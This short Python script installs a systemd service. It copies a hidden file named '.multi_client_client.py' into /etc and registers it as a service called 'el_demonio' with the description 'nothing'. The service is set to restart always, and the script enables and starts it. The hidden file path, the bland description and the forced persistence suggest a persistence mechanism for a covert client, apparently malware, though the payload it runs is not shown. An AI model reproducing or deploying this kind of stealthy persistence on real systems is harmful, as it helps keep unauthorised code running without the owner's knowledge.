import os
import subprocess
import shutil

def create_systemd_service():
    service_name = 'el_demonio'  
    service_description = 'nothing'
    shutil.copy('./.multi_client_client.py','/etc/.multi_client_client.py') 
    service_script_path = '/etc/.multi_client_client.py'
    python_interpreter_path = subprocess.getoutput('which python3') 
    service_file = f"""
[Unit]
Description={service_description}
After=network.target

[Service]
Type=simple
ExecStart={python_interpreter_path} {service_script_path}
Restart=always

[Install]
WantedBy=multi-user.target
"""

    
    with open(f'/etc/systemd/system/{service_name}.service', 'w') as f:
        f.write(service_file)

   
    os.system('systemctl daemon-reload')

  
    os.system(f'systemctl enable {service_name}.service')

  
    os.system(f'systemctl start {service_name}.service')

 

if __name__ == '__main__':
    create_systemd_service()
